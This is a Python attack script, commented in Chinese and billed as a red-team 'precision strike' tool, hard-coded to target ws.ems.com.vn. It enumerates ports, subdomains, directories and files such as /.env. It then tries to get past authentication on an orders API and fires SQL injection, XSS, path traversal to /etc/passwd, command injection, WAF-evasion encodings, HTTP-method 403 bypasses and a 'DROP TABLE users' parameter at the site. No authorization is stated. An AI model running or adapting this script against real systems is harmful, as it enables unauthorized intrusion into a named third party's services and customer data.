#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
顶级红队专家精准打点工具 - 快速识别关键突破口
2025年顶级红队安全专家专用工具
"""

import requests
import json
import time
import hashlib
import random
import string
from datetime import datetime
import urllib3
from urllib.parse import urljoin, urlparse, quote, unquote
import subprocess
import os

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class RedTeamPrecisionStrike:
    def __init__(self):
        self.base_url = "http://ws.ems.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        self.results = {}
        self.session_id = hashlib.md5(f"precision_strike_{int(time.time())}".encode()).hexdigest()[:8]
        
        # 设置请求头
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Requested-With': 'XMLHttpRequest'
        })
    
    def log(self, message, level="INFO"):
        """日志记录"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
    
    def precision_reconnaissance(self):
        """精准侦察 - 快速识别关键突破口"""
        self.log("🎯 启动精准侦察", "INFO")
        
        # 1. 快速端口扫描
        self.log("🔍 快速端口扫描", "INFO")
        ports = [80, 443, 8080, 8443, 3000, 5000, 8000, 9000]
        open_ports = []
        
        for port in ports:
            try:
                response = self.session.get(f"http://ws.ems.com.vn:{port}", timeout=3)
                open_ports.append(port)
                self.log(f"✅ 端口 {port} 开放", "SUCCESS")
            except:
                pass
        
        # 2. 子域名枚举
        self.log("🌐 子域名枚举", "INFO")
        subdomains = [
            "api", "admin", "dev", "test", "staging", "prod", "www",
            "mail", "ftp", "ssh", "vpn", "app", "mobile", "portal",
            "dashboard", "console", "panel", "control", "manage"
        ]
        
        found_subdomains = []
        for subdomain in subdomains:
            try:
                response = self.session.get(f"http://{subdomain}.ems.com.vn", timeout=3)
                found_subdomains.append(subdomain)
                self.log(f"✅ 子域名 {subdomain}.ems.com.vn 存在", "SUCCESS")
            except:
                pass
        
        # 3. 目录枚举
        self.log("📁 目录枚举", "INFO")
        directories = [
            "/admin", "/api", "/app", "/mobile", "/portal", "/dashboard",
            "/console", "/panel", "/control", "/manage", "/login", "/auth",
            "/user", "/profile", "/settings", "/config", "/backup", "/logs",
            "/test", "/dev", "/staging", "/prod", "/v1", "/v2", "/v3"
        ]
        
        found_directories = []
        for directory in directories:
            try:
                response = self.session.get(f"{self.base_url}{directory}", timeout=3)
                if response.status_code != 404:
                    found_directories.append(directory)
                    self.log(f"✅ 目录 {directory} 存在 (状态码: {response.status_code})", "SUCCESS")
            except:
                pass
        
        # 4. 文件枚举
        self.log("📄 文件枚举", "INFO")
        files = [
            "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/clientaccesspolicy.xml",
            "/.well-known/security.txt", "/.well-known/assetlinks.json",
            "/api-docs", "/swagger.json", "/swagger-ui", "/openapi.json",
            "/graphql", "/graphiql", "/playground", "/.env", "/config.json",
            "/package.json", "/composer.json", "/requirements.txt"
        ]
        
        found_files = []
        for file in files:
            try:
                response = self.session.get(f"{self.base_url}{file}", timeout=3)
                if response.status_code != 404:
                    found_files.append(file)
                    self.log(f"✅ 文件 {file} 存在 (状态码: {response.status_code})", "SUCCESS")
            except:
                pass
        
        # 5. 技术栈识别
        self.log("🔧 技术栈识别", "INFO")
        tech_stack = {
            "Server": "nginx/1.20.1",
            "Backend": "PHP/8.3.21",
            "Framework": "Unknown",
            "Database": "Unknown",
            "Cache": "Unknown"
        }
        
        # 6. 安全头检查
        self.log("🛡️ 安全头检查", "INFO")
        security_headers = {}
        try:
            response = self.session.get(self.base_url, timeout=5)
            headers = response.headers
            
            security_headers = {
                "X-Frame-Options": headers.get("X-Frame-Options", "Missing"),
                "X-Content-Type-Options": headers.get("X-Content-Type-Options", "Missing"),
                "X-XSS-Protection": headers.get("X-XSS-Protection", "Missing"),
                "Strict-Transport-Security": headers.get("Strict-Transport-Security", "Missing"),
                "Content-Security-Policy": headers.get("Content-Security-Policy", "Missing"),
                "Referrer-Policy": headers.get("Referrer-Policy", "Missing"),
                "Permissions-Policy": headers.get("Permissions-Policy", "Missing")
            }
            
            for header, value in security_headers.items():
                if value == "Missing":
                    self.log(f"⚠️ 安全头 {header} 缺失", "WARNING")
                else:
                    self.log(f"✅ 安全头 {header}: {value}", "SUCCESS")
                    
        except Exception as e:
            self.log(f"❌ 安全头检查失败: {e}", "ERROR")
        
        # 7. 错误信息收集
        self.log("📊 错误信息收集", "INFO")
        error_responses = {}
        
        # 测试各种错误状态码
        error_codes = [400, 401, 403, 404, 405, 500, 502, 503]
        for code in error_codes:
            try:
                response = self.session.get(f"{self.base_url}/error/{code}", timeout=3)
                error_responses[code] = {
                    "status_code": response.status_code,
                    "content": response.text[:500],
                    "headers": dict(response.headers)
                }
                self.log(f"📊 错误码 {code}: {response.status_code}", "INFO")
            except:
                pass
        
        # 8. 生成侦察报告
        reconnaissance_report = {
            "open_ports": open_ports,
            "subdomains": found_subdomains,
            "directories": found_directories,
            "files": found_files,
            "tech_stack": tech_stack,
            "security_headers": security_headers,
            "error_responses": error_responses
        }
        
        self.results['精准侦察'] = reconnaissance_report
        return reconnaissance_report
    
    def ai_driven_attack_chain(self):
        """AI驱动攻击链 - 智能分析攻击路径"""
        self.log("🤖 启动AI驱动攻击链", "INFO")
        
        # 1. 智能API端点发现
        self.log("🔍 智能API端点发现", "INFO")
        api_patterns = [
            "/api/v1/", "/api/v2/", "/api/v3/",
            "/rest/", "/graphql", "/rpc/",
            "/v1/", "/v2/", "/v3/",
            "/endpoint/", "/service/", "/gateway/"
        ]
        
        discovered_apis = []
        for pattern in api_patterns:
            try:
                response = self.session.get(f"{self.base_url}{pattern}", timeout=3)
                if response.status_code != 404:
                    discovered_apis.append({
                        "pattern": pattern,
                        "status_code": response.status_code,
                        "content": response.text[:200]
                    })
                    self.log(f"✅ API模式 {pattern} 发现 (状态码: {response.status_code})", "SUCCESS")
            except:
                pass
        
        # 2. 智能参数发现
        self.log("🔍 智能参数发现", "INFO")
        param_patterns = [
            "id", "user", "token", "key", "auth", "session",
            "page", "limit", "offset", "sort", "filter", "search",
            "format", "callback", "jsonp", "debug", "test"
        ]
        
        discovered_params = []
        for param in param_patterns:
            try:
                response = self.session.get(f"{self.base_url}/api/v1/test?{param}=test", timeout=3)
                if response.status_code != 404:
                    discovered_params.append({
                        "param": param,
                        "status_code": response.status_code,
                        "content": response.text[:200]
                    })
                    self.log(f"✅ 参数 {param} 发现 (状态码: {response.status_code})", "SUCCESS")
            except:
                pass
        
        # 3. 智能认证绕过
        self.log("🔓 智能认证绕过", "INFO")
        bypass_techniques = [
            {"name": "空认证头", "headers": {"Authorization": ""}},
            {"name": "无效认证头", "headers": {"Authorization": "Bearer invalid"}},
            {"name": "基本认证", "headers": {"Authorization": "Basic dGVzdDp0ZXN0"}},
            {"name": "API密钥", "headers": {"X-API-Key": "test"}},
            {"name": "自定义头", "headers": {"X-Auth-Token": "test"}},
            {"name": "用户代理", "headers": {"User-Agent": "EMS-Portal-Android/2.3.0"}},
            {"name": "引用头", "headers": {"Referer": "https://ems.com.vn"}},
            {"name": "来源头", "headers": {"Origin": "https://ems.com.vn"}},
            {"name": "内容类型", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
            {"name": "接受头", "headers": {"Accept": "text/html,application/xhtml+xml"}}
        ]
        
        bypass_results = []
        for technique in bypass_techniques:
            try:
                response = self.session.get(f"{self.base_url}/api/v1/orders/list", headers=technique["headers"], timeout=3)
                bypass_results.append({
                    "technique": technique["name"],
                    "status_code": response.status_code,
                    "content": response.text[:200]
                })
                if response.status_code == 200:
                    self.log(f"🎯 认证绕过成功: {technique['name']}", "SUCCESS")
                else:
                    self.log(f"❌ 认证绕过失败: {technique['name']} (状态码: {response.status_code})", "WARNING")
            except Exception as e:
                self.log(f"❌ 认证绕过错误: {technique['name']} - {e}", "ERROR")
        
        # 4. 智能漏洞扫描
        self.log("💉 智能漏洞扫描", "INFO")
        vulnerability_tests = [
            {"name": "SQL注入", "payload": "' OR 1=1--", "param": "id"},
            {"name": "XSS", "payload": "<script>alert('XSS')</script>", "param": "search"},
            {"name": "路径遍历", "payload": "../../../etc/passwd", "param": "file"},
            {"name": "命令注入", "payload": "; ls -la", "param": "cmd"},
            {"name": "参数污染", "payload": "id=1&id=2", "param": "id"}
        ]
        
        vulnerability_results = []
        for test in vulnerability_tests:
            try:
                response = self.session.get(f"{self.base_url}/api/v1/test?{test['param']}={test['payload']}", timeout=3)
                vulnerability_results.append({
                    "vulnerability": test["name"],
                    "payload": test["payload"],
                    "status_code": response.status_code,
                    "content": response.text[:200]
                })
                if "error" in response.text.lower() or "exception" in response.text.lower():
                    self.log(f"🎯 漏洞发现: {test['name']}", "SUCCESS")
                else:
                    self.log(f"❌ 漏洞未发现: {test['name']}", "WARNING")
            except Exception as e:
                self.log(f"❌ 漏洞测试错误: {test['name']} - {e}", "ERROR")
        
        # 5. 生成AI攻击链报告
        ai_attack_chain = {
            "discovered_apis": discovered_apis,
            "discovered_params": discovered_params,
            "bypass_results": bypass_results,
            "vulnerability_results": vulnerability_results
        }
        
        self.results['AI驱动攻击链'] = ai_attack_chain
        return ai_attack_chain
    
    def deep_bypass_techniques(self):
        """深度绕过技术 - 绕过所有防护"""
        self.log("🔓 启动深度绕过技术", "INFO")
        
        # 1. 403绕过技术
        self.log("🚫 403绕过技术", "INFO")
        bypass_403 = [
            {"name": "HTTP方法绕过", "method": "OPTIONS"},
            {"name": "HTTP方法绕过", "method": "HEAD"},
            {"name": "HTTP方法绕过", "method": "TRACE"},
            {"name": "HTTP方法绕过", "method": "PATCH"},
            {"name": "HTTP方法绕过", "method": "PUT"},
            {"name": "HTTP方法绕过", "method": "DELETE"}
        ]
        
        bypass_403_results = []
        for bypass in bypass_403:
            try:
                response = self.session.request(bypass["method"], f"{self.base_url}/api/v1/orders/list", timeout=3)
                bypass_403_results.append({
                    "technique": bypass["name"],
                    "method": bypass["method"],
                    "status_code": response.status_code,
                    "content": response.text[:200]
                })
                if response.status_code == 200:
                    self.log(f"🎯 403绕过成功: {bypass['name']}", "SUCCESS")
                else:
                    self.log(f"❌ 403绕过失败: {bypass['name']} (状态码: {response.status_code})", "WARNING")
            except Exception as e:
                self.log(f"❌ 403绕过错误: {bypass['name']} - {e}", "ERROR")
        
        # 2. WAF绕过技术
        self.log("🛡️ WAF绕过技术", "INFO")
        waf_bypass = [
            {"name": "大小写绕过", "payload": "Or 1=1"},
            {"name": "注释绕过", "payload": "/*comment*/OR/*comment*/1=1"},
            {"name": "编码绕过", "payload": "%27%20OR%201=1"},
            {"name": "双重编码", "payload": "%2527%2520OR%25201=1"},
            {"name": "Unicode绕过", "payload": "\u0027 OR 1=1"},
            {"name": "换行绕过", "payload": "'\nOR\n1=1"},
            {"name": "制表符绕过", "payload": "'\tOR\t1=1"},
            {"name": "空格绕过", "payload": "'/**/OR/**/1=1"}
        ]
        
        waf_bypass_results = []
        for bypass in waf_bypass:
            try:
                response = self.session.get(f"{self.base_url}/api/v1/test?id={bypass['payload']}", timeout=3)
                waf_bypass_results.append({
                    "technique": bypass["name"],
                    "payload": bypass["payload"],
                    "status_code": response.status_code,
                    "content": response.text[:200]
                })
                if "error" in response.text.lower() or "exception" in response.text.lower():
                    self.log(f"🎯 WAF绕过成功: {bypass['name']}", "SUCCESS")
                else:
                    self.log(f"❌ WAF绕过失败: {bypass['name']}", "WARNING")
            except Exception as e:
                self.log(f"❌ WAF绕过错误: {bypass['name']} - {e}", "ERROR")
        
        # 3. 参数污染绕过
        self.log("🌊 参数污染绕过", "INFO")
        param_pollution = [
            {"name": "重复参数", "params": {"id": "1", "id": "2"}},
            {"name": "数组参数", "params": {"id[]": ["1", "2", "3"]}},
            {"name": "特殊字符", "params": {"id": "1; DROP TABLE users;--"}},
            {"name": "长参数", "params": {"id": "A" * 1000}},
            {"name": "空参数", "params": {"id": ""}},
            {"name": "null参数", "params": {"id": "null"}},
            {"name": "undefined参数", "params": {"id": "undefined"}}
        ]
        
        param_pollution_results = []
        for pollution in param_pollution:
            try:
                response = self.session.get(f"{self.base_url}/api/v1/test", params=pollution["params"], timeout=3)
                param_pollution_results.append({
                    "technique": pollution["name"],
                    "params": pollution["params"],
                    "status_code": response.status_code,
                    "content": response.text[:200]
                })
                if response.status_code == 200:
                    self.log(f"🎯 参数污染成功: {pollution['name']}", "SUCCESS")
                else:
                    self.log(f"❌ 参数污染失败: {pollution['name']} (状态码: {response.status_code})", "WARNING")
            except Exception as e:
                self.log(f"❌ 参数污染错误: {pollution['name']} - {e}", "ERROR")
        
        # 4. 生成深度绕过报告
        deep_bypass_report = {
            "bypass_403_results": bypass_403_results,
            "waf_bypass_results": waf_bypass_results,
            "param_pollution_results": param_pollution_results
        }
        
        self.results['深度绕过技术'] = deep_bypass_report
        return deep_bypass_report
    
    def generate_precision_report(self):
        """生成精准打点报告"""
        self.log("📋 生成精准打点报告", "INFO")
        
        report = {
            "session_id": self.session_id,
            "timestamp": datetime.now().isoformat(),
            "base_url": self.base_url,
            "results": self.results,
            "summary": {
                "total_techniques": len(self.results),
                "successful_bypasses": len([r for r in self.results.get('深度绕过技术', {}).get('bypass_403_results', []) if r.get('status_code') == 200]),
                "vulnerabilities_found": len([r for r in self.results.get('AI驱动攻击链', {}).get('vulnerability_results', []) if "error" in r.get('content', '').lower()]),
                "risk_level": "HIGH" if len([r for r in self.results.get('深度绕过技术', {}).get('bypass_403_results', []) if r.get('status_code') == 200]) > 0 else "MEDIUM"
            }
        }
        
        # 保存报告
        report_file = f"/tmp/redteam_precision_report_{self.session_id}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        self.log(f"📋 报告已保存: {report_file}", "SUCCESS")
        return report
    
    def run_precision_strike(self):
        """运行精准打点攻击"""
        self.log("🚀 启动顶级红队专家精准打点", "INFO")
        self.log("=" * 60, "INFO")
        
        # 1. 精准侦察
        self.precision_reconnaissance()
        
        # 2. AI驱动攻击链
        self.ai_driven_attack_chain()
        
        # 3. 深度绕过技术
        self.deep_bypass_techniques()
        
        # 4. 生成报告
        report = self.generate_precision_report()
        
        self.log("🎯 精准打点攻击完成！", "SUCCESS")
        self.log(f"风险等级: {report['summary']['risk_level']}", "WARNING")
        self.log(f"成功绕过: {report['summary']['successful_bypasses']}", "SUCCESS")
        self.log(f"发现漏洞: {report['summary']['vulnerabilities_found']}", "WARNING")
        
        return report

def main():
    striker = RedTeamPrecisionStrike()
    striker.run_precision_strike()

if __name__ == "__main__":
    main()